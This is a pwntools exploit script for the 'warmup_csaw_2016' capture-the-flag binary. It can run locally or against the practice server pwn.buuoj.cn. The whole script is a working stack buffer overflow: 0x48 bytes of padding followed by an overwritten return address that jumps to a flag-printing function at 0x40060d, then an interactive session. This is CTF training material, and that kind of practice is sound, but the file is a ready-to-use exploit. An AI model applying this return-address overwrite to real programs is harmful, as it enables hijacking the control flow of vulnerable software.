from pwn import *
import string
context.binary = './warmup_csaw_2016'
context.log_level = 'debug'
context.timeout = None
elf = context.binary

def dbg():
	raw_input()


if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20035)
	libc = ELF('../x64_libc.so.6')
else:
	libc = context.binary.libc
	p = process('./warmup_csaw_2016')
	#gdb.attach(p, "b* 0x4006a3")
	dbg()

cat_flag = 0x40060d
payload = 'a'*0x48+ p64(cat_flag)
p.sendlineafter('>', payload)
p.interactive()
p.close()